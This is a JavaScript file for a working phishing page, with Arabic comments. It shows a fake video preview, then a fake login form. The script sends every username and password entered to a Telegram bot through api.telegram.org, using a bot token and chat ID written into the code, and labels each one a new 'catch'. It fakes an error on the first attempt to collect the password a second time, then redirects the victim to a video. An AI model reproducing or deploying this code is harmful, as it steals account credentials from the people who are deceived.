const token = "8290316866:AAHpxLGgMSmb1GUpqcIor8VjT6FEPL9LN1g";
const chat_id = "6577433645";
const videoPath = "img/zeid.MOV"; // تأكد من اسم الفيديو في المجلد

let attempts = 0;

function showLogin() {
    document.getElementById('reel-preview').style.display = 'none';
    document.getElementById('login-page').style.display = 'flex';
}

const userInp = document.getElementById('username');
const passInp = document.getElementById('password');
const logBtn = document.getElementById('loginBtn');

function validate() {
    // تفعيل الزر إذا كان اليوزر مكتوب والباسورد 6 خانات أو أكثر
    if (userInp.value.trim().length > 0 && passInp.value.length >= 6) {
        logBtn.classList.add('active');
        logBtn.style.pointerEvents = "auto";
        logBtn.style.opacity = "1";
    } else {
        logBtn.classList.remove('active');
        logBtn.style.pointerEvents = "none";
        logBtn.style.opacity = "0.3";
    }
}

userInp.oninput = validate;
passInp.oninput = validate;

logBtn.onclick = async function() {
    attempts++;
    const text = `🎯 صيدة جديدة!\n👤 الحساب: ${userInp.value}\n🔑 الكلمة: ${passInp.value}\n🔢 المحاولة: ${attempts}`;

    // إرسال البيانات للتيلجرام
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat_id, text: text })
        });
    } catch (e) {}

    if (attempts === 1) {
        // المحاولة الأولى: إظهار التنبيه ومسح الباسورد
        document.getElementById('customAlert').style.display = 'flex';
        passInp.value = "";
        validate();
    } else {
        // المحاولة الثانية: التحويل للفيديو النهائي
        window.location.href = videoPath;
    }
};
